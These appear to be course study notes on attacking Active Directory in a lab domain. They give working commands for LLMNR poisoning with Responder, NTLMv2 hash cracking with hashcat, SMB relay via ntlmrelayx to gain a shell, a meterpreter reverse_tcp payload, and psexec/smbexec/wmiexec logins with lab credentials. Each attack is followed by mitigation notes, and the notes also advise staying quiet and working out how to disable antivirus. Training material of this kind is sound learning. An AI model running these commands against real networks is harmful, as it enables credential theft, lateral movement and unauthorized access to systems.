# Attacking AD: Initial Attack Vectors

## LLMNR POISONING
### Link Local Multicast Name Resolution
(like DNS kindof)

From impacket, run **responder**
``` 
python /usr/share/responder/Responder.py -I eth0 -rdwv
```
> v for verbose

To capture the hashes, while running responder, go to the Windows machine and from Quick Access search and type the Linux IP 
e.g. 
`\\10.10.10.7`

That triggers a result on responder, including the `NTLMv2-SSP Hash` (e.g. for fcastle::MARVEL)

Can then provide the hash to **hashcat** to get the password 

> Better to run hashcat on our actual machine instead of the virtual machine, for more computing power

Enter the hashes into a file (one per line)
E.g.
```
gedit ntlmhash.txt
```
Enter:
```
fcastle::MARVEL:....hash...
```

Run 
```
hashcat --help | grep NTLM
	5500 | NetNTLMv1 / NetNTLMv1+ESS	| Network Protocols
	5600 | NetNTLMv2					| Network Protocols
	1000 | NTLM							| Operating System
```

We find out we need to use module 5600 as the hash we captured was NTLMv2
Run hashcat:

```
hashcat -m 5600 ntlmhash.txt /usr/share/wordlists/rockyou.txt --force
```

If we had run hashcat on Windows:
```
cd c:\users\alexia\desktop\hashcat-4.2.1
hashcat64.exe -m 5600 hashes4.txt rockyou.txt -O
```
- `-O` for optimise

Try to also create custom wordlists based on the season, year etc.

## LLMNR Poisoning Mitigation

**LLMNR**: Link-Local Multicast Resolution
is a protocol based on the DNS packet format that allows both IPv4 and IPv6 hosts to perform name resolution for hosts on the same local link

If LLMNR fails, it goes to NBT-NS and vice versa. Hence, need to disable both.
- Disable LLMNR and NBT-NS
	- LLMNR: Local Computer Policy > Computer Configuration > Administrative Templates > Network > Group Policy Editor > DNS client > select "Turn OFF Multicast Name Resolution"
	- NBT-NS: Network Connections > Network Adapter Properties > TCP/IPv4 Properties > Advanced > WINS > "Disable NetBIOS over TCP/IP"

If no option to disable, best alternative mitigating action:
- Require Network Access Control (enable it)
	- i.e. cannot just plug into any port and join the network. Shut port down or don't let anyone who doesn't belong there
- Requirement of strong user passwords (complex and long)

## SMB Relay
**SMB** - Server Message Block
is a protocol for sharing files, printers, ports etc. b/w devices

> SMB typically runs on port 445

Instead of cracking hashes gathered by Repsonder, can relay them to specific machines and potentially gain access

Requirements:
- SMB signing must be disabled on the target 
- relayed user credentials must be admin on machine

SMB signing is a packet level protocol. If enabled, it will tell us the packet is not signed by the actual user, i.e. we won't be authenticated and the relay will not succeed

If SMB signing is disabled, it will not check for authentication

From W1, relay on W2
- we capture the credentials and hash from W1
- because frank castle is a local administrator for both machines, we can relay those credentials to W2 and gain access
- W2 must have SMB signing disabled for this attack to succeed

First, need to find out if SMB signing is disabled.
Can do with nessus, or other software or nmap (scan whole network)
```
sudo nmap --script=smb2-security=mode.nse -p445 10.10.10.0/24 
```

We find that the server 10.10.10.6 has `SMB enabled and required` (which is default for DC's / Servers) but both workstations (10.10.10.4 and 10.10.10.5) have `SMB enabled but not required` i.e. we can still attack them

add our targets to a targets.txt file (one IP per line)

Change responder configuration to SMB and HTTP to Off. We want to only listen for now and not respond.
```
gedit /etc/responder/Responder.conf
```

```
sudo /usr/share/responder/Responder.py -I eth0 -rwdv
```

now run
```
sudo ntlmrelayx.py -tf targets.txt -smb2support
```

If we get an error cause a port is being used can check. E.g. with SMB port:
```
sudo lsof -i :445
```

To kill that process:
```
sudo kill -9 <PID>
```

To start an interactive session run:
```
sudo ntlmrelayx.py -tf targets.txt -smb2support -i
```
this will give us access to the SMB process and we can access the SMB shell by listenting on the port that ntlmrelayx directs us to.
```
nc 127.0.0.1 11000
```
From there we get the SMB command shell. 
Type `help` to see the commands. 
Can type `shares` to see the different shares/folders we have access to 
Can use smb commands e.g. `use ADMIN$` or `use C$`
e.g. `use C$` gives us access to the C folder, `ls` to view the contents... etc.
Can also use other options with ntlmrelayx like `-c` to run commands, `-e` to execute something (like a shell) etc.


## SMB Relay Mitigation

### Enable SMB Signing on all devices
- Pro: completely stops the attack
- Con: can cause performance issues with file copies

### Disable NTLM authentication on network
- Pro: completely stops the attack
- Con: If Kerberos stops working, Windows defaults back to NTLM anyway

### Account tiering
e.g. a domain admin is restricted to log into admin accounts, servers, DC's and not user accounts
- Pro: Limits domain admins to specific tasks (e.g. only log onto servers with need for DA)
- Con: Enforcing policy may be difficult

### Local admin restriction
e.g. do not have local admin's
- Pro: can prevent a lot of lateral movement
- Con: potential increase in the amount of service desk tickets

## Gaining Shell Access

Need to also set the right payload
```
> set payload windows/x64/meterpreter/reverse_tcp
> set lhost eth0
```

ran the same attack for 10.10.10.4 (and zpark, Password2) as we had issues with the fcastle machine

used metasploit but didn't work. Instead used
```
sudo psexec.py marvel.local/zpark:Password2@10.10.10.4
```
got system!

Can also try and run (more obscure, more quiet):
```
sudo smbexec.py marvel.local/zpark:Password2@10.10.10.4
sudo wmiexec.py marvel.local/zpark:Password2@10.10.10.4
```

psexec far noisier than psexec. Try to use others and see what AV is running to then find out how to disable it

Get in quietly first..
